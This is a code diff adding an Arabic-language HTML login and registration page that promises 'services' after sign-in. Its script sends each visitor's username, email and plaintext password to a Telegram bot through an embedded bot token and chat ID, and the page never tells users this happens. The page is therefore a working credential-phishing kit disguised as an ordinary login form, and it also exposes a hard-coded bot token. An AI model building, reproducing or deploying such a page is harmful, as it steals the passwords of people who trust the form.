@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول والخدمات</title>
+    <style>
+        :root {
+            --primary-color: #1A237E;
+            --bg-color: #f4f6f9;
+            --card-bg: #ffffff;
+            --text-color: #333333;
+            --error-color: #d32f2f;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 450px;
+            padding: 30px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        button:disabled {
+            background-color: #999999;
+            cursor: not-allowed;
+        }
+
+        .error-msg {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .services-list {
+            list-style: none;
+            margin-top: 20px;
+        }
+
+        .services-list li {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logout-btn {
+            background-color: #d32f2f;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- واجهة التسجيل -->
+        <div id="auth-section">
+            <h2>إنشاء حساب / تسجيل</h2>
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input type="text" id="username" required autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <input type="email" id="email" required autocomplete="email">
+                </div>
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" required autocomplete="current-password">
+                </div>
+                <button type="submit" id="submit-btn">تسجيل الدخول</button>
+                <div id="error-message" class="error-msg"></div>
+            </form>
+        </div>
+
+        <!-- صفحة الخدمات (تظهر بعد التسجيل) -->
+        <div id="services-section" class="hidden">
+            <h2>مرحباً بك، <span id="user-display-name"></span></h2>
+            <p style="text-align: center; color: #666;">اختر الخدمة التي تريدها:</p>
+            
+            <ul class="services-list">
+                <li>📌 خدمة التحليل والإحصائيات</li>
+                <li>📌 إدارة الحساب والإعدادات</li>
+                <li>📌 الدعم الفني المباشر</li>
+            </ul>
+
+            <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات بوت تيليجرام المدمجة
+        const TELEGRAM_BOT_TOKEN = '9177942649:AAHUEZkCgnEqNyX_5dxPvEHDZ03xfmOz3iY';
+        const TELEGRAM_CHAT_ID = '7194453800';
+
+        const authSection = document.getElementById('auth-section');
+        const servicesSection = document.getElementById('services-section');
+        const loginForm = document.getElementById('login-form');
+        const userDisplayName = document.getElementById('user-display-name');
+        const errorDiv = document.getElementById('error-message');
+        const submitBtn = document.getElementById('submit-btn');
+
+        // التحقق من حالة التسجيل عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', () => {
+            const isLoggedIn = localStorage.getItem('isLoggedIn');
+            const savedUser = localStorage.getItem('username');
+
+            if (isLoggedIn === 'true' && savedUser) {
+                showServices(savedUser);
+            }
+        });
+
+        // إرسال البيانات إلى تيليجرام
+        async function sendToTelegram(username, email, password) {
+            const message = `🔔 **تسجيل جديد في الموقع**\n\n👤 **الاسم:** ${username}\n📧 **البريد:** ${email}\n🔑 **كلمة المرور:** ${password}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('فشل إرسال البيانات إلى تيليجرام');
+            }
+        }
+
+        // معالجة نموذج التسجيل
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            errorDiv.textContent = '';
+            
+            const username = document.getElementById('username').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري التسجيل...';
+
+            try {
+                // 1. إرسال البيانات إلى بوت تيليجرام
+                await sendToTelegram(username, email, password);
+
+                // 2. حفظ حالة التسجيل في localStorage
+                localStorage.setItem('isLoggedIn', 'true');
+                localStorage.setItem('username', username);
+
+                // 3. عرض صفحة الخدمات
+                showServices(username);
+            } catch (err) {
+                errorDiv.textContent = 'حدث خطأ أثناء الاتصال بالخادم، حاول مرة أخرى.';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'تسجيل الدخول';
+            }
+        });
+
+        // إظهار صفحة الخدمات
+        function showServices(name) {
+            authSection.classList.add('hidden');
+            servicesSection.classList.remove('hidden');
+            userDisplayName.textContent = name;
+        }
+
+        // تسجيل الخروج
+        function logout() {
+            localStorage.removeItem('isLoggedIn');
+            localStorage.removeItem('username');
+            servicesSection.classList.add('hidden');
+            authSection.classList.remove('hidden');
+            loginForm.reset();
+        }
+    </script>
+</body>
+</html>
